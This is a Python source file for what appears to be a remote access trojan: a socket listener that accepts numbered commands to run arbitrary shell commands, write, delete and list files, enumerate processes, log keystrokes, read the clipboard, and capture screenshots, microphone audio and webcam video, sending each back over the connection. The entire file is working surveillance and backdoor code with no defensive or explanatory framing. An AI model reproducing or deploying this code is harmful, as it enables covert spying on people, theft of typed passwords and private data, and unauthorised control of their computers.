import os
import re
import cv2
import uuid
import json
import base64
import psutil
import socket
import platform
import clipboard
import subprocess
import sounddevice
import scipy.io.wavfile as wavfile
from mss import mss
from pynput.keyboard import Listener

hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)

HOST = "127.0.0.1"
PORT = 65432
BUF_SIZE = 1048576


def get_system_info():
    try:
        info = {"platform": platform.system(), "platform-release": platform.release(),
                "platform-version": platform.version(), "architecture": platform.machine(),
                "hostname": socket.gethostname(), "ip-address": socket.gethostbyname(socket.gethostname()),
                "mac-address": ':'.join(re.findall("..", "%012x" % uuid.getnode())), "processor": platform.processor(),
                "ram": str(round(psutil.virtual_memory().total / (1024.0 ** 3))) + " GB"}
        response = json.dumps(info)
    except Exception as e:
        response = f"Error: {e}"
    return response


def options(command):
    try:
        response = subprocess.check_output(command, shell=True, universal_newlines=True)
    except subprocess.CalledProcessError as e:
        response = f"CalledProcessError: {e}"
    return response


def get_file_dir_info(path):
    if platform.system() == "Windows":
        response = options(f"dir {path}")
    elif platform.system() == "Linux":
        response = options(f"ls -la {path}")
    else:
        response = "Platform are not supported"
    return response


def save_base64_to_file(file_code, output_path):
    try:
        with open(output_path, "wb") as file:
            file.write(base64.b64decode(file_code))
        response = f"File saved to '{output_path}'"
    except Exception as e:
        response = f"Error: {e}"
    return response


def delete_file(path):
    try:
        os.remove(path)
        response = f"File '{path}' deleted"
    except Exception as e:
        response = f"Error: {e}"
    return response


def get_processes():
    try:
        response = '\n'.join([proc.name() for proc in psutil.process_iter()])
    except Exception as e:
        response = f"Error: {e}"
    return response


def run_keylogger(num_presses):
    history = []
    try:
        def on_press(key):
            history.append(str(key))
            if len(history) == num_presses:
                return False
            return True
        with Listener(on_press=on_press) as listener:
            listener.join()
        response = ' '.join(history)
    except Exception as e:
        response = f"Error: {e}"
    return response


def get_clipboard():
    try:
        response = clipboard.paste()
    except Exception as e:
        response = f"Error: {e}"
    return response


def get_screenshot():
    try:
        with mss() as sct:
            sct.compression_level = 8
            filename = sct.shot(mon=-1)
        with open(filename, "rb") as file:
            response = base64.b64encode(file.read()).decode("utf8")
        os.remove(filename)
    except Exception as e:
        response = f"Error: {e}"
    return response


def get_audio(seconds, sr=11025, filename="audio.wav"):
    try:
        record = sounddevice.rec(int(seconds * sr), samplerate=sr, channels=1)
        sounddevice.wait()
        wavfile.write(filename, sr, record)
        with open(filename, "rb") as file:
            response = base64.b64encode(file.read()).decode("utf8")
        os.remove(filename)
    except Exception as e:
        response = f"Error: {e}"
    return response


def get_video(seconds, fps=25, filename="video.avi"):
    try:
        cap = cv2.VideoCapture(0)
        width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
        height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
        writer = cv2.VideoWriter(filename, cv2.VideoWriter_fourcc(*'DIVX'), fps, (width, height))
        i = 0
        while cap.isOpened():
            ret, frame = cap.read()
            if not ret:
                break
            writer.write(frame)
            i += 1
            if i >= seconds * fps:
                break
        cap.release()
        writer.release()
        with open(filename, "rb") as file:
            response = base64.b64encode(file.read()).decode("utf8")
        os.remove(filename)
    except Exception as e:
        response = f"Error: {e}"
    return response


while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((HOST, PORT))
            s.listen()
            conn, addr = s.accept()
            with conn:
                while True:
                    data = conn.recv(BUF_SIZE)
                    cmd = data.decode().strip().split()
                    if not cmd:
                        cmd = ['0']
                    if cmd[0].lower() == "exit":
                        options("exit")
                        break
                    elif cmd[0] == '1':
                        output = get_system_info()
                    elif cmd[0] == '2':
                        output = options(' '.join(cmd[1:]))
                    elif cmd[0] == '3':
                        output = get_file_dir_info(cmd[1])
                    elif cmd[0] == '4':
                        output = save_base64_to_file(cmd[1], cmd[2])
                    elif cmd[0] == '5':
                        output = delete_file(cmd[1])
                    elif cmd[0] == '6':
                        output = get_processes()
                    elif cmd[0] == '7':
                        output = run_keylogger(int(cmd[1]))
                    elif cmd[0] == '8':
                        output = get_clipboard()
                    elif cmd[0] == '9':
                        output = get_screenshot()
                    elif cmd[0] == '10':
                        output = get_audio(int(cmd[1]))
                    elif cmd[0] == '11':
                        output = get_video(int(cmd[1]))
                    else:
                        output = "CommandNotFound"
                    conn.sendall(str.encode(output))
    except ConnectionResetError as exc:
        pass
